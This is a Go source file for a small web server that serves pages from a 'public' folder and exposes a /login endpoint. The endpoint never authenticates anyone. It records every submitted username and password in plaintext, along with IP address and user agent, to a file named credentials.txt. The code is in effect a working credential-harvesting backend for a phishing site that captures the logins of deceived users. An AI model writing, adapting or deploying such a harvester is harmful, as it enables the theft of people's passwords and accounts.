package main

import (
	"net/http"
	"os"
	"time"

	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

func login(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseForm(); err != nil {
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		log.WithFields(log.Fields{
			"time":  time.Now().Format("2006-01-02 15:04:05"),
			"error": err.Error(),
		}).Error("Failed to parse form")
		return
	}

	username := r.FormValue("_user")
	password := r.FormValue("_pass")

	if username == "" || password == "" {
		http.Error(w, "Username or password missing", http.StatusBadRequest)
		log.WithFields(log.Fields{
			"time": time.Now().Format("2006-01-02 15:04:05"),
		}).Warn("Missing username or password")
		return
	}

	log.WithFields(log.Fields{
		"time":       time.Now().String(),
		"username":   username,
		"password":   password,
		"user-agent": r.UserAgent(),
		"ip_address": r.RemoteAddr,
	}).Info("login attempt")
	
	
}

func main() {
	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer fh.Close()
	log.SetOutput(fh)
	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	log.Fatal(http.ListenAndServe(":8000", r))
}
